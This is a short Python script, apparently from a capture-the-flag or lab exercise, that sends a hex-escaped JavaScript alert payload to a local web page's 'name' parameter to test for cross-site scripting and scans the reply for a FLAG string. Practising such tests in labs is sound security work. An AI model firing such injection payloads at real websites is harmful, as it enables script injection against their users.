import requests
import re

# Target URL
base_url = "http://127.0.0.1:32908/page"

# Test payload 1: Hex escapes
payload1 = "+alert(\"\\x58\\x53\\x53\")+"
print("[PAYLOAD 1] Hex escapes")
print(f"Payload: {payload1}")

try:
    response = requests.get(base_url, params={"name": payload1}, timeout=10)
    print(f"Status: {response.status_code}")
    print(f"Length: {len(response.content)} bytes")
    
    # Check for FLAG
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"\n🚩 FLAG FOUND: {flags[0]}")
    
    print(f"\nResponse:\n{response.text}")
    
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*80 + "\n")

